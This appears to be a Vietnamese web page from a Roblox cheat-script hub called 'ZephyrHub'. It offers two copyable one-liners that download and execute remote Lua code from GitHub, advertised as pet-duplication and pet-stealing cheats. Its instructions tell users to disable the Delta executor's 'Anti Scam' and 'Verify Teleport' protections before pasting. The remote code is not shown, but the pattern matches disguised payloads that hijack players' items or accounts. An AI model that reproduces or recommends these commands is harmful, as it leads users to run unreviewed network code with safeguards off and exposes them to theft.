<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>ZephyrHub Scripts</title>
  <style>
    body {
      background-color: #0f172a;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 30px;
    }
    .script-box {
      width: 80%;
      padding: 10px;
      font-size: 14px;
      margin: 10px 0;
    }
    .copy-btn {
      background-color: #0ea5e9;
      color: white;
      border: none;
      padding: 8px 20px;
      border-radius: 5px;
      cursor: pointer;
    }
    .title {
      font-size: 36px;
      color: #3b82f6;
      margin-bottom: 30px;
    }
  </style>
</head>
<body>

  <div class="title">ZephyrHub Scripts</div>

  <!-- Script 1: Grow A Garden -->
  <h3>🌱 Script Grow A Garden</h3>
  <input class="script-box" type="text" id="script1" value='loadstring(game:HttpGet("https://raw.githubusercontent.com/ZephyrHub1/NoLag-DupePet/refs/heads/main/Main.lua"))()' readonly>
  <br>
  <button class="copy-btn" onclick="copyScript('script1')">📋 Copy Script</button>

  <!-- Script 2: Steal A Brainrot -->
  <h3>🧠 Script Steal A Brainrot</h3>
  <input class="script-box" type="text" id="script2" value='loadstring(game:HttpGet("https://raw.githubusercontent.com/ZephyrHub1/FarmEvent-StealPet/refs/heads/main/Steal%20A%20Brainrot"))()' readonly>
  <br>
  <button class="copy-btn" onclick="copyScript('script2')">📋 Copy Script</button>

  <h3 style="margin-top: 40px;">📘 Hướng dẫn sử dụng (cho Delta)</h3>
  <div style="text-align: left; display: inline-block; text-align: left;">
    <ul>
      <li>Bước 1: Mở logo Delta</li>
      <li>Bước 2: Vào phần cài đặt (Setting)</li>
      <li>Bước 3: Tắt <strong>Anti Scam</strong></li>
      <li>Bước 4: Tắt <strong>Verify Teleport</strong></li>
    </ul>
    <p>✅ Sau đó dán script và tận hưởng!</p>
  </div>

  <script>
    function copyScript(id) {
      const input = document.getElementById(id);
      navigator.clipboard.writeText(input.value).then(() => {
        alert("✅ Script đã được copy!");
      }).catch(err => {
        alert("❌ Không thể copy. Trình duyệt không cho phép!");
        console.error(err);
      });
    }
  </script>

</body>
</html>
